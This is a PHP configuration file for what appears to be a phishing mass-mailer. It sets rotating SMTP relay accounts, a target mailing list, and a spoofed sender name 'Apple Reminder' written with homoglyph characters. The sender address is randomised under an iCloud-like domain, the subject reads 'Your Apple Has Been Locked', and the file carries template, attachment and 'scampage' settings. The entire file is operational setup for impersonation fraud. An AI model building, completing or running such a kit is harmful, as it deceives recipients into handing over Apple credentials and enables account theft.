<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@otw22juta.com",
        "password" => "XXXXXXXXXXXXXXX"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@otw22juta.com",
        "password" => "XXXXXXXXXXXXXX"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@otw22juta.com",
        "password" => "XXXXXXXXXXXXXXXXX"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "Αррlе Rеmіndег",
    "frommail"       => "##randstring##.##randstring##@##randstring##.v.icloud.com",
    "subject"        => $date . " Your Apple Has Been Locked.",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://google.com"],
];
